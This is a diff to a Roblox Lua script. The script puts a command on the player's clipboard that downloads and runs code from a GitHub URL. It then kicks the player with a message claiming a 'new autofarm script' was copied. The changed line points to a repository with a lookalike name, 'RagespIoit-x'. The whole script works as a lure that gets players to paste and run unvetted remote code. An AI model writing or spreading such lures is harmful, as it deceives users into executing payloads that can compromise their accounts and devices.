@@ -1,4 +1,4 @@
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
-setclipboard('loadstring(game:HttpGet("https://raw.githubusercontent.com/Pablo0P-87/AdoptMe/main/RageSploit"))()')
+setclipboard('loadstring(game:HttpGet("https://raw.githubusercontent.com/RagespIoit-x/Ragesploit/refs/heads/main/MainScript/Loader.lua"))()')
 player:Kick("Event ended😥 New autofarm script copied to clipboard")
